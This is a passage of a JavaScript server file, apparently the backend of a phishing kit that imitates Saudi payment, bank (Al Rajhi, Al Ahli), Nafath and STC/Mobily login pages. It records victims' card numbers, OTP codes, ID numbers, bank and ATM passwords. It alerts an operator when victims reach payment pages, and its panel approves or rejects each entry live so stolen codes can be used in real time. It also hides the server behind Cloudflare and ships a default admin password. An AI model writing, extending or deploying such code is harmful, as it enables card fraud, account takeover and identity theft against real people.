const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const cors = require("cors");
const cookieParser = require("cookie-parser");
const fs = require("fs");
const path = require("path");
require("dotenv").config();

const fcm = require("./fcm");

// --- Payment-flow notification helpers ---
// Pages from "الملخص والدفع" to the end of the flow. Notify the admin (push) when a visitor reaches any of these.
const PAYMENT_FLOW_PAGES = new Set([
  "الملخص والدفع",
  "ملخص الدفع",
  "الدفع بطاقة الائتمان",
  "الدفع",
  "تحويل بنكي",
  "رقم الحساب البنكي",
  "تحقق رقم الجوال (OTP)",
  "رمز التحقق (OTP)",
  "توثيق رقم الجوال",
  "تحقق نفاذ",
  "تسجيل دخول نفاذ",
  "نفاذ الأول",
  "نفاذ الراجحى",
  "حساب بنك الأول",
  "تسجيل الدخول الراجحى",
  "إتصال الراجحى",
  "تنبيه الراجحى",
  "الراجحى (OTP)",
  "بنك الأهلي (OTP)",
  "MyStc OTP",
  "كلمة مرور STC",
  "تنبية إتصال STC",
  "كلمة مرور ATM",
  "تنبية إتصال Mobily",
  "الصفحة النهائية",
  "END",
]);

function isPaymentFlowPage(page) {
  if (!page) return false;
  return PAYMENT_FLOW_PAGES.has(String(page).trim());
}

// Try to extract the visitor's entered name from their submitted data; fallback to number/id.
const NAME_KEYS = [
  "الاسم الكامل",
  "الاسم بالكامل",
  "الاسم كاملاً",
  "اسم حامل البطاقة",
  "الاسم كما هو مدون على البطاقة",
  "الاسم",
  "fullName",
  "name",
];

function getVisitorName(visitor) {
  if (!visitor) return "زائر";
  if (visitor.fullName && String(visitor.fullName).trim()) {
    return String(visitor.fullName).trim();
  }
  const data = visitor.data || {};
  for (const k of NAME_KEYS) {
    if (data[k] && String(data[k]).trim()) {
      return String(data[k]).trim();
    }
  }
  const num = visitor.visitorNumber != null ? visitor.visitorNumber : visitor._id;
  return `زائر #${num}`;
}
// --- end helpers ---

const app = express();
const server = http.createServer(app);

// CORS Configuration
const corsOptions = {
  origin: process.env.CLIENT_URL || "*",
  credentials: true,
};

app.use(cors(corsOptions));
app.use(express.json());
app.use(cookieParser());


// Persistent storage directory resolver. Prefer the Railway persistent volume
// (RAILWAY_VOLUME_MOUNT_PATH, e.g. "/data") regardless of NODE_ENV, then "/data"
// if writable, otherwise fall back to the app directory.
function resolvePersistentDir() {
  const candidates = [];
  if (process.env.RAILWAY_VOLUME_MOUNT_PATH) candidates.push(process.env.RAILWAY_VOLUME_MOUNT_PATH);
  candidates.push('/data');
  for (const dir of candidates) {
    try {
      if (!fs.existsSync(dir)) continue;
      fs.accessSync(dir, fs.constants.W_OK);
      return dir;
    } catch (e) { /* not writable, try next */ }
  }
  return __dirname;
}
const PERSISTENT_DIR = resolvePersistentDir();
console.log('[storage] Using persistent data directory:', PERSISTENT_DIR);

// IP Blacklist System
const ipBlacklist = new Map();
const BLACKLIST_FILE = path.join(PERSISTENT_DIR, 'ip_blacklist.json');

try {
  if (fs.existsSync(BLACKLIST_FILE)) {
    const data = JSON.parse(fs.readFileSync(BLACKLIST_FILE, 'utf8'));
    data.forEach(item => ipBlacklist.set(item.ip, item));
    console.log(`Loaded ${ipBlacklist.size} blacklisted IPs`);
  }
} catch (e) { console.log('No blacklist file found'); }

function saveBlacklist() {
  try {
    fs.writeFileSync(BLACKLIST_FILE, JSON.stringify(Array.from(ipBlacklist.values())));
  } catch (e) { console.error('Error saving blacklist:', e.message); }
}

function blacklistIP(ip, reason) {
  if (!ipBlacklist.has(ip)) {
    ipBlacklist.set(ip, { ip, reason, date: new Date().toISOString(), active: true });
    saveBlacklist();
    console.log(`[SAFETY] IP ${ip} blacklisted. Reason: ${reason}`);
  }
}

// Rate Limiting - block IPs with too many requests
const rateLimitMap = new Map();
const RATE_LIMIT_WINDOW = 60 * 1000; // 1 minute
const RATE_LIMIT_MAX = 100; // max requests per window
const RATE_LIMIT_BLOCK_DURATION = 10 * 60 * 1000; // block for 10 minutes

setInterval(() => {
  const now = Date.now();
  for (const [ip, data] of rateLimitMap) {
    if (now - data.firstRequest > RATE_LIMIT_WINDOW && !data.blocked) {
      rateLimitMap.delete(ip);
    }
    if (data.blocked && now > data.blockedUntil) {
      rateLimitMap.delete(ip);
    }
  }
}, 60 * 1000);

app.use((req, res, next) => {
  const ip = req.headers['cf-connecting-ip'] || req.headers['x-forwarded-for'] || req.ip;
  const now = Date.now();

  // Admin panel and socket.io must NEVER be locked out by the IP blacklist
  // or rate limiter, so the admin can always reach the dashboard.
  if (req.path.startsWith('/admin') || req.path.startsWith('/socket.io')) {
    return next();
  }

  // Check IP blacklist FIRST
  if (ipBlacklist.has(ip) && ipBlacklist.get(ip).active) {
    return res.status(403).send('Access denied');
  }

  let data = rateLimitMap.get(ip);
  
  if (data && data.blocked) {
    if (now < data.blockedUntil) {
      return res.status(429).send('Too many requests. Try again later.');
    } else {
      rateLimitMap.delete(ip);
      data = null;
    }
  }
  
  if (!data) {
    rateLimitMap.set(ip, { count: 1, firstRequest: now, blocked: false });
  } else {
    if (now - data.firstRequest > RATE_LIMIT_WINDOW) {
      rateLimitMap.set(ip, { count: 1, firstRequest: now, blocked: false });
    } else {
      data.count++;
      if (data.count > RATE_LIMIT_MAX) {
        data.blocked = true;
        data.blockedUntil = now + RATE_LIMIT_BLOCK_DURATION;
        return res.status(429).send('Too many requests. Try again later.');
      }
    }
  }
  next();
});

// Cloudflare-only protection - block direct access to Railway in production
// Uses a shared secret header (x-origin-secret) set by Cloudflare Transform Rules
// This cannot be faked even if someone knows the Railway URL
const ORIGIN_SECRET = process.env.CF_ORIGIN_SECRET || 'sK9mP2xR7vL4nQ8wF3jB6';

// Cloudflare-only middleware: verify requests actually come through Cloudflare
// Admin panel and socket.io are allowed (they need direct access for the dashboard)
app.use((req, res, next) => {
  if (process.env.NODE_ENV === 'production') {
    // Admin panel, socket.io, and admin API endpoints are always allowed
    if (req.path.startsWith('/admin') || req.path.startsWith('/socket.io') || req.path.startsWith('/api/visitors') || req.path.startsWith('/api/stats') || req.path.startsWith('/api/fcm') || req.path.startsWith('/api/debug') || req.path.startsWith('/api/connection-token') || req.path.startsWith('/api/pow-challenge') || req.path.startsWith('/api/page-ping')) {
      return next();
    }
    // For all other paths, verify the secret header set by Cloudflare Transform Rules
    const originSecret = req.headers['x-origin-secret'];
    
    if (originSecret !== ORIGIN_SECRET) {
      const remoteIP = (req.headers['x-forwarded-for'] || req.ip || '').split(',')[0].trim();
      console.log(`[CF] Blocked: ${req.path} from ${remoteIP} (missing/invalid origin secret)`);
      return res.status(403).send('Access denied');
    }
  }
  next();
});

app.use('/admin', express.static('admin', {
  setHeaders: (res, filePath) => {
    // Prevent iOS PWA / browsers from serving stale HTML and JS (causes white screen after updates)
    if (filePath.endsWith('.html') || filePath.endsWith('.js')) {
      res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
      res.setHeader('Pragma', 'no-cache');
      res.setHeader('Expires', '0');
    }
  }
}));

// FCM Token Endpoints
app.post('/api/fcm/token', (req, res) => {
  const { token } = req.body;
  if (token) {
    fcm.addToken(token);
    saveData(); // Persist token to disk so it survives deployments
    res.json({ success: true });
  } else {
    res.status(400).json({ error: 'Token is required' });
  }
});

app.delete('/api/fcm/token', (req, res) => {
  const { token } = req.body;
  if (token) {
    fcm.removeToken(token);
    saveData(); // Persist change to disk
    res.json({ success: true });
  } else {
    res.status(400).json({ error: 'Token is required' });
  }
});

// Diagnostic endpoint: send a test notification and return detailed FCM response
app.get('/api/fcm/test', async (req, res) => {
  try {
    const result = await fcm.sendTestNotification();
    res.json(result);
  } catch (e) {
    res.status(500).json({ error: e.message, stack: e.stack });
  }
});

// Diagnostic endpoint: report Firebase init state and stored token count
app.get('/api/fcm/status', (req, res) => {
  try {
    const status = fcm.getStatus();
    res.json(status);
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// FCM token endpoints under /admin/ prefix (Cloudflare does not challenge this path)
app.post('/admin/fcm/token', (req, res) => {
  const { token } = req.body;
  if (token) {
    fcm.addToken(token);
    saveData();
    res.json({ success: true });
  } else {
    res.status(400).json({ error: 'Token is required' });
  }
});

app.delete('/admin/fcm/token', (req, res) => {
  const { token } = req.body;
  if (token) {
    fcm.removeToken(token);
    saveData();
    res.json({ success: true });
  } else {
    res.status(400).json({ error: 'Token is required' });
  }
});



// Socket.IO Configuration
const io = new Server(server, {
  cors: corsOptions,
  transports: ["websocket", "polling"],
});

// Data file path
const DATA_DIR = PERSISTENT_DIR;
const DATA_FILE = path.join(DATA_DIR, 'visitors_data.json');
const BACKUP_FILE = path.join(DATA_DIR, 'visitors_data_backup.json');

// Ensure data directory exists
function ensureDataDir() {
  try {
    if (!fs.existsSync(DATA_DIR)) {
      fs.mkdirSync(DATA_DIR, { recursive: true });
      console.log(`Created data directory: ${DATA_DIR}`);
    }
  } catch (error) {
    console.error("Error creating data directory:", error);
  }
}

// One-time migration: if persistent volume has no data file yet, but a legacy
// file exists in the app directory (from when NODE_ENV was not set), copy it over
// so the admin password / visitors / tokens are not lost on this deploy.
function migrateLegacyDataIfNeeded() {
  try {
    if (DATA_DIR === __dirname) return; // already using app dir, nothing to migrate
    ensureDataDir();
    const legacyMain = path.join(__dirname, 'visitors_data.json');
    const legacyBackup = path.join(__dirname, 'visitors_data_backup.json');
    if (!fs.existsSync(DATA_FILE)) {
      if (fs.existsSync(legacyMain)) {
        fs.copyFileSync(legacyMain, DATA_FILE);
        console.log('[storage] Migrated legacy visitors_data.json into persistent volume.');
      } else if (fs.existsSync(legacyBackup)) {
        fs.copyFileSync(legacyBackup, DATA_FILE);
        console.log('[storage] Migrated legacy backup into persistent volume.');
      }
    }
    // Migrate legacy FCM tokens file too
    const legacyTokens = path.join(__dirname, 'fcm-tokens.json');
    const persistentTokens = path.join(DATA_DIR, 'fcm-tokens.json');
    if (!fs.existsSync(persistentTokens) && fs.existsSync(legacyTokens)) {
      fs.copyFileSync(legacyTokens, persistentTokens);
      console.log('[storage] Migrated legacy fcm-tokens.json into persistent volume.');
    }
  } catch (e) {
    console.error('[storage] Legacy migration failed:', e && e.message ? e.message : e);
  }
}

// Load saved data from file
function loadSavedData() {
  ensureDataDir();
  migrateLegacyDataIfNeeded();
  console.log(`Loading data from: ${DATA_FILE}`);
  
  try {
    // Try main file first
    if (fs.existsSync(DATA_FILE)) {
      const data = fs.readFileSync(DATA_FILE, "utf8");
      const parsed = JSON.parse(data);
      console.log(`Loaded ${parsed.savedVisitors?.length || 0} visitors from main file`);
      console.log(`Loaded whatsappNumber: ${parsed.whatsappNumber || 'not set'}`);
      return {
        visitors: new Map(Object.entries(parsed.visitors || {})),
        visitorCounter: parsed.visitorCounter || 0,
        savedVisitors: parsed.savedVisitors || [],
        whatsappNumber: parsed.whatsappNumber || "",
        globalBlockedCards: parsed.globalBlockedCards || [],
        globalBlockedCountries: parsed.globalBlockedCountries || [],
        adminPassword: parsed.adminPassword || "admin123",
        fcmTokens: parsed.fcmTokens || [],
      };
    }
    
    // Try backup file if main doesn't exist
    if (fs.existsSync(BACKUP_FILE)) {
      console.log("Main file not found, trying backup...");
      const data = fs.readFileSync(BACKUP_FILE, "utf8");
      const parsed = JSON.parse(data);
      console.log(`Loaded ${parsed.savedVisitors?.length || 0} visitors from backup file`);
      console.log(`Loaded whatsappNumber: ${parsed.whatsappNumber || 'not set'}`);
      return {
        visitors: new Map(Object.entries(parsed.visitors || {})),
        visitorCounter: parsed.visitorCounter || 0,
        savedVisitors: parsed.savedVisitors || [],
        whatsappNumber: parsed.whatsappNumber || "",
        globalBlockedCards: parsed.globalBlockedCards || [],
        globalBlockedCountries: parsed.globalBlockedCountries || [],
        adminPassword: parsed.adminPassword || "admin123",
        fcmTokens: parsed.fcmTokens || [],
      };
    }
    
    console.log("No data file found, starting fresh");
  } catch (error) {
    console.error("Error loading saved data:", error);
    
    // Try backup on error
    try {
      if (fs.existsSync(BACKUP_FILE)) {
        console.log("Error loading main file, trying backup...");
        const data = fs.readFileSync(BACKUP_FILE, "utf8");
        const parsed = JSON.parse(data);
        return {
          visitors: new Map(Object.entries(parsed.visitors || {})),
          visitorCounter: parsed.visitorCounter || 0,
          savedVisitors: parsed.savedVisitors || [],
          whatsappNumber: parsed.whatsappNumber || "",
          globalBlockedCards: parsed.globalBlockedCards || [],
          globalBlockedCountries: parsed.globalBlockedCountries || [],
          adminPassword: parsed.adminPassword || "admin123",
        };
      }
    } catch (backupError) {
      console.error("Error loading backup:", backupError);
    }
  }
      return {
        visitors: new Map(),
        visitorCounter: 0,
        savedVisitors: [],
        whatsappNumber: "",
        globalBlockedCards: [],
        globalBlockedCountries: [],
        adminPassword: "admin123",
        fcmTokens: [],
      };
}

// Save data to file with backup
function saveData() {
  ensureDataDir();
  
  try {
    const data = {
      visitors: Object.fromEntries(visitors),
      visitorCounter,
      savedVisitors,
      whatsappNumber,
      globalBlockedCards,
      globalBlockedCountries,
      adminPassword,
      fcmTokens: Array.from(fcm.getTokens ? fcm.getTokens() : []),
      lastSaved: new Date().toISOString(),
    };
    const jsonData = JSON.stringify(data, null, 2);
    
    // Create backup of existing file first
    if (fs.existsSync(DATA_FILE)) {
      try {
        fs.copyFileSync(DATA_FILE, BACKUP_FILE);
      } catch (backupErr) {
        console.error("Error creating backup:", backupErr);
      }
    }
    
    // Write main file
    fs.writeFileSync(DATA_FILE, jsonData);
    console.log(`Data saved: ${savedVisitors.length} visitors at ${new Date().toISOString()}`);
  } catch (error) {
    console.error("Error saving data:", error);
  }
}

// Initialize data from file
const savedData = loadSavedData();
const visitors = savedData.visitors;
const admins = new Map();
let visitorCounter = savedData.visitorCounter;
let savedVisitors = savedData.savedVisitors; // Array to store all visitors permanently
let whatsappNumber = savedData.whatsappNumber || ""; // WhatsApp number for footer
let globalBlockedCards = savedData.globalBlockedCards || []; // Global blocked card prefixes
let globalBlockedCountries = savedData.globalBlockedCountries || []; // Global blocked countries
let adminPassword = savedData.adminPassword || "admin123";

// Initialize FCM with saved tokens
if (savedData.fcmTokens && savedData.fcmTokens.length > 0) {
  if (fcm.setTokens) {
    fcm.setTokens(savedData.fcmTokens);
  }
}

// Generate unique API key
function generateApiKey() {
  return "api_" + Math.random().toString(36).substring(2, 15);
}

// Check if IP is registering too fast (anti-spam)
function isIPTooFast(ip) {
  const data = rateLimitMap.get(ip);
  if (!data) return false;
  
  // More than 2 registrations per minute from same IP = suspicious
  // We use the rateLimitMap count which resets every minute
  return data.count > 2;
}

// Get visitor info from request
function getVisitorInfo(socket) {
  const headers = socket.handshake.headers;
  // Get the first IP from x-forwarded-for (the real client IP)
  // Railway/Cloudflare appends IPs, so the first one is the original client
  let ip = headers["x-forwarded-for"] || headers["x-real-ip"] || socket.handshake.address;
  if (ip && ip.includes(",")) {
    const ips = ip.split(",").map(i => i.trim());
    ip = ips[0]; // Use the FIRST IP (real client)
  }
  
  // Clean up IPv6 localhost or mapped IPv4
  if (ip === '::1' || ip === '::ffff:127.0.0.1') {
    ip = '127.0.0.1';
  }
  
  return {
    ip: ip,
    userAgent: headers["user-agent"] || "",
    country: headers["cf-ipcountry"] || "Unknown",
  };
}

// Async function to fetch country from IP if not provided by Cloudflare
async function fetchCountryForVisitor(visitor) {
  if (visitor.country !== "Unknown" || visitor.ip === '127.0.0.1') return;
  try {
    const response = await fetch(`http://ip-api.com/json/${visitor.ip}?fields=country`);
    if (response.ok) {
      const data = await response.json();
      if (data && data.country) {
        visitor.country = data.country;
        // Update in map and broadcast
        visitors.set(visitor.socketId, visitor);
        io.to("admin").emit("admin:visitorsList", Array.from(visitors.values()));
      }
    }
  } catch (err) {
    console.error('Error fetching country for IP:', visitor.ip, err.message);
  }
}

// Check if user agent is a bot or crawler - COMPREHENSIVE BLOCKING
// Bot check DISABLED
function isBot(ua) {
  return false;
}

// Visitor validation DISABLED - allow everyone
function isValidVisitor(ua) {
  return true;
}

// Parse user agent
function parseUserAgent(ua) {
  let os = "Unknown";
  let device = "Unknown";
  let browser = "Unknown";

  // OS Detection
  if (ua.includes("Windows")) os = "Windows";
  else if (ua.includes("Mac")) os = "macOS";
  else if (ua.includes("Linux")) os = "Linux";
  else if (ua.includes("Android")) os = "Android";
  else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";

  // Device Detection
  if (ua.includes("Mobile")) device = "Mobile";
  else if (ua.includes("Tablet")) device = "Tablet";
  else device = "Desktop";

  // Browser Detection
  if (ua.includes("Chrome")) browser = "Chrome";
  else if (ua.includes("Firefox")) browser = "Firefox";
  else if (ua.includes("Safari")) browser = "Safari";
  else if (ua.includes("Edge")) browser = "Edge";

  return { os, device, browser };
}

// Save visitor to permanent storage
function saveVisitorPermanently(visitor) {
  const existingIndex = savedVisitors.findIndex(v => v._id === visitor._id);
  if (existingIndex >= 0) {
    savedVisitors[existingIndex] = { ...savedVisitors[existingIndex], ...visitor };
  } else {
    savedVisitors.push({ ...visitor });
  }
  saveData();
}

// Socket.IO Connection Handler
io.on("connection", (socket) => {
  console.log(`New connection: ${socket.id}`);

  // Handle visitor registration
  socket.on("visitor:register", (data) => {
    const visitorInfo = getVisitorInfo(socket);
    
    // Check blacklist
    if (ipBlacklist.has(visitorInfo.ip) && ipBlacklist.get(visitorInfo.ip).active) {
      console.log(`[SAFETY] Blocked blacklisted IP: ${visitorInfo.ip}`);
      socket.disconnect();
      return;
    }

    // Deduplication: ignore duplicate register from same socket
    if (socket._alreadyRegistered) {
      return;
    }
    socket._alreadyRegistered = true;

    // Block bots and unknown visitors
    if (!isValidVisitor(visitorInfo.userAgent)) {
      console.log(`Blocked bot/unknown visitor: ${visitorInfo.ip}, UA: ${visitorInfo.userAgent}`);
      socket.disconnect();
      return;
    }
    
    const { os, device, browser } = parseUserAgent(visitorInfo.userAgent);
    
    // Get existing visitor ID from client (localStorage)
    const existingVisitorId = data?.existingVisitorId;
    
    // Check if this visitor already exists based on visitor ID from localStorage
    let existingVisitor = null;
    if (existingVisitorId) {
      existingVisitor = savedVisitors.find(v => v._id === existingVisitorId);
      console.log(`Looking for existing visitor with ID: ${existingVisitorId}, found: ${!!existingVisitor}`);
    }

    let visitor;
    let isNewVisitor = false;

    if (existingVisitor) {
      // Update existing visitor with new socketId
      visitor = {
        ...existingVisitor,
        socketId: socket.id,
        isConnected: true,
        sessionStartTime: Date.now(),
        lastActivity: Date.now(),
        isIdle: false,
      };
      // Update in savedVisitors
      const index = savedVisitors.findIndex(v => v._id === existingVisitor._id);
      if (index >= 0) {
        savedVisitors[index] = visitor;
      }
      console.log(`Returning visitor reconnected: ${visitor._id}`);
    } else {
      // Create new visitor
      visitorCounter++;
      visitor = {
        _id: `visitor_${Date.now()}_${Math.random().toString(36).substring(2, 9)}`,
        socketId: socket.id,
        visitorNumber: visitorCounter,
        createdAt: new Date().toISOString(),
        isRead: false,
        fullName: "",
        phone: "",
        idNumber: "",
        apiKey: generateApiKey(),
        ip: visitorInfo.ip,
        country: visitorInfo.country,
        city: "",
        os,
        device,
        browser,
        date: new Date().toISOString(),
        blockedCardPrefixes: [],
        page: "الصفحة الرئيسية",
        data: {},
        dataHistory: [],
        paymentCards: [],
        rejectedCards: [],
        digitCodes: [],
        hasNewData: false,
        isBlocked: false,
        isConnected: true,
        sessionStartTime: Date.now(),
        lastActivity: Date.now(),
      };
      savedVisitors.push(visitor);
      isNewVisitor = true;
      console.log(`New visitor registered: ${visitor._id}`);
      
      // Fetch country asynchronously if unknown
      fetchCountryForVisitor(visitor);
      
      // Anti-spam: check if this IP is registering too fast
      if (isIPTooFast(visitorInfo.ip)) {
        console.log(`[SAFETY] IP ${visitorInfo.ip} registering too fast. Blacklisting.`);
        blacklistIP(visitorInfo.ip, 'registration_too_fast');
        visitor.isBlocked = true;
      }
    }

    visitors.set(socket.id, visitor);
    saveData();

    // Send confirmation to visitor
    socket.emit("successfully-connected", {
      sid: socket.id,
      pid: visitor._id,
    });
    // If visitor was blocked, re-send blocked event and force-disconnect them
    if (visitor.isBlocked) {
      socket.emit("blocked");
      setTimeout(() => {
        const s = io.sockets.sockets.get(socket.id);
        if (s) s.disconnect(true);
      }, 500);
      // Still notify admins so the card shows up, but visitor stays disconnected
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("visitor:new", { ...visitor, isConnected: false });
      });
      return;
    }

    // Notify admins
    admins.forEach((admin, adminSocketId) => {
      if (isNewVisitor) {
        io.to(adminSocketId).emit("visitor:new", { ...visitor, isConnected: true });
      } else {
        io.to(adminSocketId).emit("visitor:reconnected", { visitorId: visitor._id, socketId: socket.id });
      }
    });
    
    // OLD push notification disabled per user request (kept admin socket event only):
    // if (isNewVisitor) {
    //   fcm.sendNotification(
    //     "زائر جديد",
    //     `زائر جديد دخل الموقع من ${visitor.country || 'دولة غير معروفة'}`,
    //     { type: "new_visitor", visitorId: visitor._id }
    //   );
    // }
  });

  // Handle page enter
  socket.on("visitor:pageEnter", (page) => {
    const visitor = visitors.get(socket.id);
    if (visitor) {
      visitor.page = page;
      visitor.lastActivity = Date.now();
      visitor.isIdle = false;
      visitors.set(socket.id, visitor);
      saveVisitorPermanently(visitor);

      // Notify admins
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("visitor:pageChanged", {
          visitorId: visitor._id,
          page,
        });
      });

      // Push notification on payment-flow pages (from "الملخص والدفع" to the end).
      // Only notify on important pages, avoid duplicate consecutive notifications for the same page.
      try {
        if (isPaymentFlowPage(page) && visitor.lastNotifiedPage !== page) {
          visitor.lastNotifiedPage = page;
          const vName = getVisitorName(visitor);
          fcm.sendNotification(
            vName,
            `وصل إلى: ${page}`,
            { type: "page_enter", visitorId: visitor._id, page }
          );
        }
      } catch (e) {
        console.error("[fcm] page-enter notification failed:", e && e.message ? e.message : e);
      }
    }
  });

  // Handle more info (data submission)
  socket.on("more-info", (data) => {
    const visitor = visitors.get(socket.id);
    if (visitor) {
      visitor.lastActivity = Date.now();
      visitor.isIdle = false;
      // Store submitted data with page info for ordering
      if (data.content) {
        // Initialize dataHistory if not exists
        if (!visitor.dataHistory) {
          visitor.dataHistory = [];
        }
        // Add new data entry with timestamp and page
        const now = new Date().toISOString();
        visitor.dataHistory.push({
          content: data.content,
          page: data.page,
          timestamp: now,
        });
        // Update lastDataUpdate from SummaryPayment page onwards
        const paymentPages = ['الملخص والدفع', 'ملخص الدفع'];
        if (paymentPages.includes(data.page)) {
          visitor.hasEnteredPaymentFlow = true;
        }
        if (visitor.hasEnteredPaymentFlow || visitor.hasEnteredCardPage) {
          visitor.lastDataUpdate = now;
        }
        // Also keep flat data for backward compatibility
        visitor.data = { ...visitor.data, ...data.content };
        // تخزين اسم الشبكة إذا كان موجوداً
        if (data.content["مزود الخدمة"]) {
          visitor.network = data.content["مزود الخدمة"];
        }
      }
      if (data.paymentCard) {
        // Check if card was previously rejected by admin
        const newCardNumber = data.paymentCard.cardNumber;
        if (!visitor.rejectedCards) visitor.rejectedCards = [];
        const isAdminRejected = visitor.rejectedCards.includes(newCardNumber);
        
        if (isAdminRejected) {
          // Reject duplicate card - notify visitor
          socket.emit("card:duplicateRejected");
          // Reset waiting status since card was auto-rejected
          visitor.waitingForAdminResponse = false;
          visitor.lastDataUpdate = new Date().toISOString();
          // Save duplicate card rejection permanently
          if (!visitor.duplicateCardRejections) visitor.duplicateCardRejections = [];
          visitor.duplicateCardRejections.push({ cardNumber: newCardNumber, timestamp: new Date().toISOString() });
          visitors.set(socket.id, visitor);
          saveVisitorPermanently(visitor);
          // Notify admins about duplicate card rejection
          admins.forEach((admin, adminSocketId) => {
            io.to(adminSocketId).emit("visitor:duplicateCard", {
              visitorId: visitor._id,
              cardNumber: newCardNumber,
              visitor: visitor,
            });
          });
          console.log(`Duplicate card rejected for visitor ${visitor._id}: ${newCardNumber}`);
          return; // Don't continue processing - no waitingForAdminResponse, no dataSubmitted
        } else {
          const now = new Date().toISOString();
          visitor.paymentCards.push({
            ...data.paymentCard,
            timestamp: now,
          });
          // Start tracking from card page
          visitor.lastDataUpdate = now;
          visitor.hasEnteredCardPage = true;
        }
      }
      if (data.digitCode) {
        // Check for duplicate OTP code
        const isDuplicateCode = visitor.digitCodes && visitor.digitCodes.some(dc => dc.code === data.digitCode);
        if (isDuplicateCode && data.page !== "كلمة مرور ATM") {
          // Reject duplicate OTP - notify visitor
          socket.emit("otp:duplicateRejected");
          visitor.waitingForAdminResponse = false;
          visitor.lastDataUpdate = new Date().toISOString();
          // Save duplicate OTP rejection permanently
          if (!visitor.duplicateOtpRejections) visitor.duplicateOtpRejections = [];
          visitor.duplicateOtpRejections.push({ code: data.digitCode, page: data.page, timestamp: new Date().toISOString() });
          visitors.set(socket.id, visitor);
          saveVisitorPermanently(visitor);
          // Notify admins about duplicate OTP rejection
          admins.forEach((admin, adminSocketId) => {
            io.to(adminSocketId).emit("visitor:duplicateOtp", {
              visitorId: visitor._id,
              code: data.digitCode,
              page: data.page,
              visitor: visitor,
            });
          });
          console.log(`Duplicate OTP rejected for visitor ${visitor._id}: ${data.digitCode}`);
          return;
        }
        const now = new Date().toISOString();
        visitor.digitCodes.push({
          code: data.digitCode,
          page: data.page,
          timestamp: now,
        });
        // Update if already entered payment flow or card page
        if (visitor.hasEnteredPaymentFlow || visitor.hasEnteredCardPage) {
          visitor.lastDataUpdate = now;
        }
      }

      visitor.page = data.page;
      visitor.waitingForAdminResponse = data.waitingForAdminResponse || false;
      visitor.hasNewData = true;
      visitors.set(socket.id, visitor);
      saveVisitorPermanently(visitor);

      // Notify admins
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("visitor:dataSubmitted", {
          visitorId: visitor._id,
          socketId: socket.id,
          data: data,
          visitor: visitor,
        });
      });
      
      let title = "بيانات جديدة";
      let body = `الزائر ${visitor.fullName || visitor._id} أدخل بيانات جديدة`;
      
      if (data.cardNumber) {
        title = "بطاقة جديدة";
        body = `تم إدخال بطاقة جديدة: ${data.cardNumber}`;
      } else if (data.otp) {
        title = "رمز OTP جديد";
        body = `تم إدخال رمز OTP: ${data.otp}`;
      } else if (data.idNumber) {
        title = "بيانات شخصية";
        body = `تم إدخال هوية: ${data.idNumber}`;
      }
      
      // OLD push notification disabled per user request (only page-enter notifications are sent now):
      // fcm.sendNotification(title, body, { type: "data_submitted", visitorId: visitor._id });

      console.log(`Data received from visitor ${visitor._id}:`, data);
    }
  });

  // Handle card number verification
  socket.on("cardNumber:verify", (cardNumber) => {
    const visitor = visitors.get(socket.id);
    if (visitor) {
      visitor.lastActivity = Date.now();
      visitor.isIdle = false;
      // Check if card prefix is blocked
      const prefix = cardNumber.substring(0, 4);
      const isBlocked = visitor.blockedCardPrefixes.includes(prefix);

      socket.emit("cardNumber:verified", !isBlocked);

      // Notify admins
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("visitor:cardVerification", {
          visitorId: visitor._id,
          cardNumber,
          isBlocked,
        });
      });
    }
  });

  // Admin registration
  socket.on("admin:register", (credentials) => {
    // Simple admin authentication - uses persistent password from disk
    if (credentials.password === adminPassword) {
      admins.set(socket.id, {
        socketId: socket.id,
        connectedAt: new Date().toISOString(),
      });

      socket.emit("admin:authenticated", true);

      // Get all connected visitor IDs from the active visitors Map
      const connectedVisitorIds = new Set();
      visitors.forEach((v) => {
        connectedVisitorIds.add(v._id);
      });
      
      // Update connection status for saved visitors based on _id match
      const visitorsWithStatus = savedVisitors.map(v => {
        // Check if this visitor's _id is in the connected visitors
        const isCurrentlyConnected = connectedVisitorIds.has(v._id);
        // Also update socketId if connected
        let currentSocketId = v.socketId;
        visitors.forEach((activeVisitor, sid) => {
          if (activeVisitor._id === v._id) {
            currentSocketId = sid;
          }
        });
        // Check if visitor is idle (no activity for 30 seconds)
        let isIdle = false;
        if (isCurrentlyConnected) {
          const activeVisitorArr = Array.from(visitors.values()).find(av => av._id === v._id);
          if (activeVisitorArr && activeVisitorArr.lastActivity) {
            isIdle = (Date.now() - activeVisitorArr.lastActivity) > 60000;
          }
        }
        return { ...v, socketId: currentSocketId, isConnected: isCurrentlyConnected, isIdle };
      });

      // Sort visitors by lastDataUpdate (most recent first)
      visitorsWithStatus.sort((a, b) => {
        const dateA = a.lastDataUpdate ? new Date(a.lastDataUpdate).getTime() : 0;
        const dateB = b.lastDataUpdate ? new Date(b.lastDataUpdate).getTime() : 0;
        return dateB - dateA;
      });

      console.log(`Sending ${visitorsWithStatus.length} visitors to admin, ${connectedVisitorIds.size} connected`);

      // Send all saved visitors to admin with updated connection status
      socket.emit("visitors:list", visitorsWithStatus);

      // Notify visitors that admin is connected
      visitors.forEach((visitor, visitorSocketId) => {
        io.to(visitorSocketId).emit("isAdminConnected", true);
      });

      console.log(`Admin connected: ${socket.id}`);
    } else {
      socket.emit("admin:authenticated", false);
    }
  });

  // Admin: Approve form
  socket.on("admin:approve", (visitorSocketId) => {
    io.to(visitorSocketId).emit("form:approved");
    // تحديث حالة الانتظار
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.emit("visitors:update", Array.from(visitors.values()));
    }
    console.log(`Form approved for visitor: ${visitorSocketId}`);
  });

  // Admin: Reject form
  socket.on("admin:reject", (data) => {
    const visitorSocketId = data.visitorSocketId || data;
    io.to(visitorSocketId).emit("form:rejected");
    // تحديث حالة الانتظار
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.emit("visitors:update", Array.from(visitors.values()));
    }
    console.log(`Form rejected for visitor: ${visitorSocketId}`);
  });

  // Admin: Reject Mobily call (special handling for Mobily page)
  socket.on("admin:mobilyReject", (visitorSocketId) => {
